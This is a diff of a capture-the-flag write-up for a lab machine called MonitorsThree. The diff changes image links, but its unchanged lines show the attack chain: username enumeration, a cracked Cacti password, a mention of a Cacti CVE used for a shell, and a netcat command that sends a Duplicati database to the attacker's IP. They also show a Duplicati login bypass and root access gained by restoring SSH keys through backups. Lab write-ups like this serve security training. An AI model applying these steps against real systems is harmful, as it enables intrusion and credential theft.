@@ -73,18 +73,18 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 Starting gobuster in VHOST enumeration mode
 ===============================================================
 Found: cacti.monitorsthree.htb Status: 302 [Size: 0] [--&gt; /cacti]</code></pre></div>
-<p><img src="/_resources/59b51422d73041f79314497407150ef4.png" /></p>
+<p><img src=":/59b51422d73041f79314497407150ef4" alt="6e96183cde9727fdde8f084408598f11.png" /></p>
 <p>Main page:</p>
-<p><img src="/_resources/6024e87537374c52be376d72318b977d.png" /></p>
+<p><img src=":/6024e87537374c52be376d72318b977d" alt="1100d9bcfbbc2d81649093b1af8e3b4c.png" /></p>
 <p>monitorsthree login page:</p>
-<p><img src="/_resources/6c69cce1702d41cb89a43b93e85c27b4.png" /></p>
+<p><img src=":/6c69cce1702d41cb89a43b93e85c27b4" alt="e947805198ffbaae00b2246c0da9245c.png" /></p>
 <p>We can try resseting passwords and it reveals to us usernames that are on the server.</p>
 <p>Admin is there:</p>
-<p><img src="/_resources/be674f049f1b4c1496256351f924ec3c.png" /></p>
+<p><img src=":/be674f049f1b4c1496256351f924ec3c" alt="1a855ba2594102ccf852e00ddf9189fe.png" /></p>
 <p>and test is not there:</p>
-<p><img src="/_resources/0e18f1a9001a4d3fa405d0ac36367205.png" /></p>
+<p><img src=":/0e18f1a9001a4d3fa405d0ac36367205" alt="bbbae279a3ef856a85bfa25707b3002d.png" /></p>
 <p>the subdomain gets us Cacti version 1.2.26.</p>
-<p><img src="/_resources/9dea8cf26c354cf3a4df8608efffd9b6.png" /></p>
+<p><img src=":/9dea8cf26c354cf3a4df8608efffd9b6" alt="d3a62cbdce7d082bce649581e0b1a773.png" /></p>
 <p>Time to start looking for some CVE’s for this “cacti”.</p>
 <p><a title="https://thehackernews.com/2024/05/critical-flaws-in-cacti-framework-could.html" href="https://thehackernews.com/2024/05/critical-flaws-in-cacti-framework-could.html">https://thehackernews.com/2024/05/critical-flaws-in-cacti-framework-could.html</a></p>
 <p>Lookining at exploit-db, NIST and metasploit, everything seems to be out of date or work with valid logins.</p>
@@ -154,9 +154,9 @@ Table: users
 </code></pre></div>
 <p>Using crackstation we get: <code>31a181c8372e3afc59dab863430610e8 md5 greencacti2001</code></p>
 <p>We are in.</p>
-<p><img src="/_resources/1ffdfc9378264d72a9dfbaea9d03365a.png" /></p>
+<p><img src=":/1ffdfc9378264d72a9dfbaea9d03365a" alt="67e3f317e6aa706d6d5ed7926726b09f.png" /></p>
 <p>Checking these creds also for cacti and we are in once again.</p>
-<p><img src="/_resources/94bb273dcddd4099abda633e4aa3588a.png" /></p>
+<p><img src=":/94bb273dcddd4099abda633e4aa3588a" alt="cd396090446e01e7d2c092b03c46e9a6.png" /></p>
 <p>We can now get the shell with the CVE.</p>
 <h1 id="cve-2024-25641">CVE-2024-25641</h1>
 <p>Googling gets us:<br />
@@ -226,7 +226,7 @@ Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost <span clas
 <span class="hljs-attribute">udp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:68</span>              <span class="hljs-number">0.0.0.0</span>:*       </code></pre></div>
 <p>Lets check what is on this port:<br />
 <code>socat TCP-LISTEN:8080,fork TCP:localhost:8200</code></p>
-<p><img src="/_resources/46535029528a4d659d4d900ff15028ac.png" /></p>
+<p><img src=":/46535029528a4d659d4d900ff15028ac" alt="ffc4c8b3fa9e90e7b2130742c7308dbf.png" /></p>
 <p>Checking if there is anything on the server about “Duplicati”. <code>/opt/duplicati/config</code> has a bunch of interesting files including Duplicati-server.sqlite. Let’s send it back to us using netcat:</p>
 <div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">on victim</span>
 nc 10.10.14.134 2222 &lt; Duplicati-server.sqlite
@@ -234,40 +234,40 @@ nc 10.10.14.134 2222 &lt; Duplicati-server.sqlite
 # </span><span class="language-bash">on host</span>
 nc -l -p 2222 &gt; received_file</code></pre></div>
 <p>In the option table we can find server passphrase and its salt.</p>
-<p><img src="/_resources/3677f8321ed2475a8e221436750b06f0.png" /></p>
+<p><img src=":/3677f8321ed2475a8e221436750b06f0" alt="6299c718660660e3f89db835cc8c74d0.png" /></p>
 <p>pass: Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=<br />
 salt: xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=</p>
 <p>Checking the logging screen with burp gets us the same salt.</p>
-<p><img src="/_resources/eca14d6cb2e54a45bdc9261660ee644e.png" /></p>
+<p><img src=":/eca14d6cb2e54a45bdc9261660ee644e" alt="3ac23b81b723fdef6a3fc28e60155a94.png" /></p>
 <p>To get it decrypted, we can need to learn what it is first.<br />
 <a title="https://hashes.com/en/tools/hash_identifier" href="https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</a></p>
-<p><img src="/_resources/3ccd8da8f70c42c68b30725ab8cad3dd.png" /></p>
+<p><img src=":/3ccd8da8f70c42c68b30725ab8cad3dd" alt="96538d00b680b7c5bafab92b97c3cb45.png" /></p>
 <p>We can reverse this process using cyberchef:</p>
 <p>pass: 59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a<br />
 salt: c537f29165757404e9159bcf84294424b273600e40e0bef8857ec52bc5e66342</p>
 <p>Couldnt decrypt it with john in reasonable amount of time, so decided to <a title="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee" href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">learn more about duplicati</a>.</p>
-<p><img src="/_resources/463a5cc3a0164e57b0d0b038c7ee3654.png" /></p>
+<p><img src=":/463a5cc3a0164e57b0d0b038c7ee3654" alt="4b8012b1ef8ade91f56a0341fbb71191.png" /></p>
 <p><a title="https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('None',0)&amp;input=V2I2ZTg1NUwzc045TFRhQ3V3UFh1YXV0c3dUSVFiZWttTUFyN0JySzJIbw" href="https://cyberchef.org/#recipe=From_Base64%28%27A-Za-z0-9%2B/%3D%27,true,false%29To_Hex%28%27None%27,0%29&amp;input=V2I2ZTg1NUwzc045TFRhQ3V3UFh1YXV0c3dUSVFiZWttTUFyN0JySzJIbw">cyberchef conversion of passwd</a></p>
-<p><img src="/_resources/e247610e0a3c4f8f864c794ab00a6e92.png" /></p>
+<p><img src=":/e247610e0a3c4f8f864c794ab00a6e92" alt="3e5df1ae561e5eb58723a60891da6e88.png" /></p>
 <p>Encode it with ctrl+u and send.</p>
-<p><img src="/_resources/a683ca5e05434d12b5216c128018af75.png" /></p>
+<p><img src=":/a683ca5e05434d12b5216c128018af75" alt="acdacabaefe7bee5cbaf9b01ec85f6aa.png" /></p>
 <p>We are in.</p>
-<p><img src="/_resources/47786839f1cb4eb2b025046bfe4f90ab.png" /></p>
+<p><img src=":/47786839f1cb4eb2b025046bfe4f90ab" alt="eb885b46c38d6fd53dd65ac64d09445b.png" /></p>
 <p>I was stumbling here for a while, trying to create a backup with root folder. Only later did I discover, that the main folder shown for backups is the docker system and <strong>our system is under source folder</strong>.</p>
 <p>Tried creating backup there then:</p>
-<p><img src="/_resources/a4813dee0a1c46aeb1045a5fa4e840aa.png" /></p>
-<p><img src="/_resources/cc4d10013f8d40fe80cc0fa6ba175943.png" /></p>
+<p><img src=":/a4813dee0a1c46aeb1045a5fa4e840aa" alt="8311c50d21fb31547c422c6c677d3449.png" /></p>
+<p><img src=":/cc4d10013f8d40fe80cc0fa6ba175943" alt="81ee742a48703bbb26370385b1ca87b8.png" /></p>
 <p>We get can now copy it to our machine, unzip and get the flag.<br />
 Looking at the root we can also find password for duplicati <code>MonitorsThreeDuplicatiBackupPassword2024</code>.</p>
-<p><img src="/_resources/6ca1e9f2da1b4a41bad848498681e334.png" /></p>
+<p><img src=":/6ca1e9f2da1b4a41bad848498681e334" alt="86fc4ddbccfd69feab322f18ade4c7c0.png" /></p>
 <p>Now time to get real root.</p>
 <p>Lets backup our ssh keys first:</p>
-<p><img src="/_resources/3109479d80654af6a2995947f83bac12.png" /></p>
+<p><img src=":/3109479d80654af6a2995947f83bac12" alt="db3b3b393c8efdf091aaedae7810dd6f.png" /></p>
 <p>Then restore them to root:</p>
-<p><img src="/_resources/c02b30912e174b10b3f7888f98d136f6.png" /></p>
-<p><img src="/_resources/e081ca5b2495413fa47b60173ca1137e.png" /></p>
+<p><img src=":/c02b30912e174b10b3f7888f98d136f6" alt="71941942174fbf8ce6c5fa25e78b7119.png" /></p>
+<p><img src=":/e081ca5b2495413fa47b60173ca1137e" alt="19d1d3b905cef35566452bcf43299cc6.png" /></p>
 <p>We can now connect via ssh to root.</p>
-<p><img src="/_resources/08fb154ab91544008da7915f64c781d5.png" /></p>
+<p><img src=":/08fb154ab91544008da7915f64c781d5" alt="291caafdb6f1d96e469d65656c555868.png" /></p>
 </div>
       </article>
     </div>
